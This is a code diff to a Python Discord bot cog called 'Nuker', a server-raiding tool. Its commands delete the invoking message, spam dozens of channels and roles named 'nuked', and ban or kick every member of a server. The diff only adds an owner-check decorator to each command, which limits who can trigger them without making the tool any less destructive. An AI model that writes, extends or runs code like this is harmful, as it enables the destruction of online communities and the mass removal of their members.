@@ -2,12 +2,14 @@
 import asyncio
 import discord
 from discord.ext import commands
+from core_utils import owner_check
 
 class Nuker(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
     @commands.command(name="nuke")
+    @owner_check()
     async def nuke(self, ctx):
         await ctx.message.delete()
         g = ctx.guild
@@ -53,6 +55,7 @@ class Nuker(commands.Cog):
         print(f"[NUKE] done {g.id}")
 
     @commands.command(name="masschannel")
+    @owner_check()
     async def masschannel(self, ctx, count: int = 40, *, name: str = "nuked"):
         await ctx.message.delete()
         for i in range(count):
@@ -63,6 +66,7 @@ class Nuker(commands.Cog):
             await asyncio.sleep(0.2)
 
     @commands.command(name="massrole")
+    @owner_check()
     async def massrole(self, ctx, count: int = 40, *, name: str = "nuked"):
         await ctx.message.delete()
         for i in range(count):
@@ -73,6 +77,7 @@ class Nuker(commands.Cog):
             await asyncio.sleep(0.2)
 
     @commands.command(name="banall")
+    @owner_check()
     async def banall(self, ctx):
         await ctx.message.delete()
         for m in list(ctx.guild.members):
@@ -85,6 +90,7 @@ class Nuker(commands.Cog):
             await asyncio.sleep(0.25)
 
     @commands.command(name="kickall")
+    @owner_check()
     async def kickall(self, ctx):
         await ctx.message.delete()
         for m in list(ctx.guild.members):
